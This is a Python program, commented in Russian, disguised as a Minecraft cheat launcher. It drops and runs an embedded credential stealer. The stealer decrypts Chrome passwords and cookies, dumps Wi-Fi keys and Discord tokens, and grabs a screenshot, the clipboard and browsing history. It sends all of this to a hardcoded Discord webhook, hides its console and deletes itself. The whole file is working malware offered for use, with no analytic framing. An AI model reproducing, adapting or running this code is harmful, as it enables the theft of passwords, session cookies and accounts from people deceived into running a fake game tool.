import os
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox
import logging

# Настройка логирования для launcher.py
logging.basicConfig(filename='launcher_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Код для stealer.py
STEALER_CODE = """
import os
import sqlite3
import win32crypt
import json
import requests
import shutil
import platform
import psutil
from datetime import datetime, timezone
from pathlib import Path
import traceback
import logging
import time
import subprocess
import tempfile
from PIL import ImageGrab
import tkinter as tk
from tkinter import messagebox
import pyperclip

# Настройка логирования для stealer.py
logging.basicConfig(filename='stealer_log.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Вебхук Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1354501574440910993/JtAT0CqjLLuVm6PskbqbSqbTvnIr3FBVX3fOFj4jfrRYCmmBwDPxxoIyOBpkfxRi8P5_"

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        logging.info("Скриншот сохранён как screenshot.png")
        return screenshot_path
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота: {str(e)}\\n{traceback.format_exc()}")
        return None

def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content[:1000] if clipboard_content else "Буфер обмена пуст"
    except Exception as e:
        logging.error(f"Ошибка в get_clipboard: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def get_chrome_history():
    try:
        history = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome History database not found")
            return "История Chrome не найдена"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            history_db = tmp_file.name
        shutil.copy2(chrome_path, history_db)
        with sqlite3.connect(history_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            for url, title, last_visit_time in cursor.fetchall():
                # Конвертация времени Chrome в читаемый формат
                if last_visit_time:
                    epoch_time = (last_visit_time / 1000000) - 11644473600  # Chrome timestamp to Unix epoch
                    visit_time = datetime.fromtimestamp(epoch_time, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
                    history.append(f"URL: {url}\\nЗаголовок: {title}\\nВремя: {visit_time}")
        for _ in range(5):
            try:
                os.remove(history_db)
                break
            except Exception as e:
                logging.warning(f"Не удалось удалить History.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(history)[:1000] if history else "История пуста"
    except Exception as e:
        logging.error(f"Ошибка в get_chrome_history: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def get_chrome_cookies():
    try:
        cookies = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome Cookies database not found")
            return "Chrome Cookies database not found"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            cookies_db = tmp_file.name
        shutil.copy2(chrome_path, cookies_db)
        with sqlite3.connect(cookies_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, value in cursor.fetchall():
                if value:
                    try:
                        decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode()
                        cookies.append(f"{host} | {name} | {decrypted_value}")
                    except Exception as e:
                        logging.warning(f"Не удалось расшифровать куки: {host} | {name}, ошибка: {str(e)}")
        for _ in range(5):
            try:
                os.remove(cookies_db)
                break
            except Exception as e:
                logging.warning(f"Не удалось удалить Cookies.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(cookies)[:1000] if cookies else "Нет куки"
    except Exception as e:
        logging.error(f"Ошибка в get_chrome_cookies: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def get_chrome_passwords():
    try:
        passwords = []
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_path):
            logging.warning("Chrome Login Data database not found")
            return "Chrome Login Data database not found"
        with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp_file:
            login_data_db = tmp_file.name
        shutil.copy2(chrome_path, login_data_db)
        with sqlite3.connect(login_data_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                if pwd and user:
                    try:
                        decrypted_pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                        passwords.append(f"URL: {url}\\nЛогин: {user}\\nПароль: {decrypted_pwd}")
                    except Exception as e:
                        logging.warning(f"Не удалось расшифровать пароль для {url}: {str(e)}")
        if passwords:
            with open("LoginData.txt", "w", encoding="utf-8") as f:
                f.write("\\n\\n".join(passwords))
        for _ in range(5):
            try:
                os.remove(login_data_db)
                break
            except Exception as e:
                logging.warning(f"Не удалось удалить LoginData.db: {str(e)}")
                time.sleep(1)
        return "\\n".join(passwords)[:1000] if passwords else "Нет паролей"
    except Exception as e:
        logging.error(f"Ошибка в get_chrome_passwords: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def get_wifi_passwords():
    try:
        data = os.popen("netsh wlan show profiles").read()
        profiles = [line.split(":")[1].strip() for line in data.splitlines() if "All User Profile" in line]
        wifi_data = []
        for profile in profiles:
            details = os.popen(f'netsh wlan show profile name="{profile}" key=clear').read()
            for line in details.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    wifi_data.append(f"Wi-Fi: {profile}\\nПароль: {password}")
        return "\\n".join(wifi_data)[:1000] if wifi_data else "Нет Wi-Fi паролей"
    except Exception as e:
        logging.error(f"Ошибка в get_wifi_passwords: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def get_system_info():
    try:
        info = {
            "OS": platform.system() + " " + platform.release(),
            "CPU": platform.processor(),
            "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "Username": os.getlogin(),
            "Timestamp": datetime.now(timezone.utc).isoformat()
        }
        return info
    except Exception as e:
        logging.error(f"Ошибка в get_system_info: {str(e)}\\n{traceback.format_exc()}")
        return {"Ошибка": str(e)}

def get_discord_tokens():
    try:
        tokens = []
        discord_path = os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb")
        if not os.path.exists(discord_path):
            return "Discord не найден"
        for file in os.listdir(discord_path):
            if file.endswith((".log", ".ldb")):
                with open(os.path.join(discord_path, file), "rb") as f:
                    content = f.read().decode("utf-8", errors="ignore")
                    if "token" in content:
                        for line in content.splitlines():
                            if "token" in line:
                                parts = line.split('"token":"')
                                if len(parts) > 1:
                                    token_part = parts[1].split('"')[0]
                                    tokens.append(token_part)
        return "\\n".join(tokens)[:1000] if tokens else "Токены не найдены"
    except Exception as e:
        logging.error(f"Ошибка в get_discord_tokens: {str(e)}\\n{traceback.format_exc()}")
        return f"Ошибка: {str(e)}"

def send_to_discord(data, screenshot_path=None):
    try:
        embed = {
            "title": "Данные с компьютера",
            "color": 0x00ff00,
            "fields": [
                {"name": "👤 Пользователь", "value": data["system"]["Username"], "inline": True},
                {"name": "💻 ОС", "value": data["system"]["OS"], "inline": True},
                {"name": "🧠 Процессор", "value": data["system"]["CPU"], "inline": False},
                {"name": "🖥️ Память", "value": data["system"]["RAM"], "inline": True},
                {"name": "📋 Буфер обмена", "value": data["clipboard"] or "Нет данных", "inline": False},
                {"name": "🌐 История Chrome", "value": data["history"] or "Нет данных", "inline": False},
                {"name": "🔑 Пароли Chrome", "value": data["passwords"] or "Нет данных", "inline": False},
                {"name": "🍪 Куки Chrome", "value": data["cookies"] or "Нет данных", "inline": False},
                {"name": "📶 Wi-Fi пароли", "value": data["wifi"] or "Нет данных", "inline": False},
                {"name": "🎮 Discord токены", "value": data["tokens"] or "Нет данных", "inline": False},
                {"name": "🕒 Время", "value": data["system"]["Timestamp"], "inline": True}
            ]
        }
        files = {}
        if os.path.exists("LoginData.txt"):
            files["file1"] = ("LoginData.txt", open("LoginData.txt", "rb"))
        if screenshot_path and os.path.exists(screenshot_path):
            files["file2"] = ("screenshot.png", open(screenshot_path, "rb"))
        if files:
            response = requests.post(WEBHOOK_URL, data={"payload_json": json.dumps({"embeds": [embed]})}, files=files)
            for file in files.values():
                file[1].close()
        else:
            response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        response.raise_for_status()
    except Exception as e:
        logging.error(f"Ошибка в send_to_discord: {str(e)}\\n{traceback.format_exc()}")
        print(f"Ошибка отправки: {str(e)}")
    finally:
        if os.path.exists("LoginData.txt"):
            for _ in range(5):
                try:
                    os.remove("LoginData.txt")
                    break
                except Exception as e:
                    logging.warning(f"Не удалось удалить LoginData.txt: {str(e)}")
                    time.sleep(1)
        if screenshot_path and os.path.exists(screenshot_path):
            for _ in range(5):
                try:
                    os.remove(screenshot_path)
                    break
                except Exception as e:
                    logging.warning(f"Не удалось удалить screenshot.png: {str(e)}")
                    time.sleep(1)

def show_message_box():
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Сообщение", "ну как там ратка?")
        root.destroy()
        logging.info("Message box 'ну как там ратка?' отображён")
    except Exception as e:
        logging.error(f"Ошибка при отображении message box: {str(e)}\\n{traceback.format_exc()}")

def main():
    try:
        subprocess.run('taskkill /IM chrome.exe /F', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        screenshot_path = take_screenshot()
        data = {
            "system": get_system_info(),
            "clipboard": get_clipboard(),
            "history": get_chrome_history(),
            "passwords": get_chrome_passwords(),
            "cookies": get_chrome_cookies(),
            "wifi": get_wifi_passwords(),
            "tokens": get_discord_tokens()
        }
        send_to_discord(data, screenshot_path)
        show_message_box()
    except Exception as e:
        logging.error(f"Ошибка в main: {str(e)}\\n{traceback.format_exc()}")
        print(f"Произошла ошибка: {str(e)}")
    finally:
        current_file = os.path.abspath(__file__)
        subprocess.Popen(f'cmd.exe /c ping 127.0.0.1 -n 1 > nul & del "{current_file}"', shell=True)

if __name__ == "__main__":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
"""

def main():
    try:
        logging.info("Запуск launcher.py")

        # Показываем сообщение "Привет" в окне
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Minecraft Чит", "Привет")
        root.destroy()
        logging.info("Окно 'Привет' отображено")

        # Получаем путь к рабочему столу
        desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
        stealer_path = os.path.join(desktop_path, "stealer.py")
        logging.info(f"Путь к stealer.py: {stealer_path}")

        # Проверяем права на запись
        if not os.access(desktop_path, os.W_OK):
            logging.error("Нет прав на запись на рабочий стол")
            raise PermissionError("Нет прав на запись на рабочий стол")

        # Тестовый запуск cmd
        logging.info("Попытка открыть cmd с тестовым сообщением")
        process_test = subprocess.Popen(['cmd.exe', '/c', 'echo', 'Тестовое сообщение'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process_test.wait()
        logging.info("cmd с тестовым сообщением выполнена")

        # Создаем stealer.py напрямую, без cmd
        logging.info("Создание stealer.py")
        with open(stealer_path, 'w', encoding='utf-8') as f:
            f.write(STEALER_CODE)
        logging.info("stealer.py создан")

        # Проверяем, что файл создан
        if not os.path.exists(stealer_path):
            logging.error("stealer.py не был создан")
            raise FileNotFoundError("stealer.py не был создан")

        # Запускаем stealer.py напрямую
        logging.info("Запуск stealer.py")
        process_stealer = subprocess.Popen(['py', stealer_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process_stealer.wait()
        logging.info("stealer.py выполнен")

    except Exception as e:
        logging.error(f"Ошибка: {str(e)}")
        raise

if __name__ == "__main__":
    # Скрываем консоль .exe
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()